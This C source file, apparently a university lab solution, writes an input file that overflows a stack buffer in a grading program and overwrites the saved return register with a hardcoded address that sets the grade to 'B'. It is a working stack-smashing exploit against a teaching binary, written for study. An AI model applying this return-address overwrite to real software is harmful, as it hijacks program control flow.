/*----------------------------------------------------------------------
 * createdataA.c
 * Author: Praneeth Bhandaru
 *
 * Produces a file called dataB with the student name, a nullbyte,
 * padding to overrun the stack, and the address of the instruction in
 * main to get a B, the latter of which will overwrite getName's stored
 * x30.
----------------------------------------------------------------------*/


#include <stdio.h>
#include <stdlib.h>

static const unsigned int lReturnAddress = 0x00400890;
static const char sName[] = "Chinmay Bhandaru";


/* Takes no parameters. Opens (and potentially creates) file 'dataB'.
 * Writes a name, nullbyte, padding, and a binary memory address to the
 * file. Returns 0 upon completion. */
int main(void) {
    int i;

    /* Open/create file dataB with write privileges */
    FILE *psFile = fopen("dataB", "w");

    /* Print the stored name into dataB */
    fprintf(psFile, sName);

    /* Add nullbytes to overrun the buffer and mark end of name */
    for (i = 0; i < 32; i++) {
        putc(0, psFile);
    }

    /* Overwrite x30 with address of 'grade = 'B'' instruction */
    fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);

    /* Close the file */
    fclose(psFile);

    return 0;
}
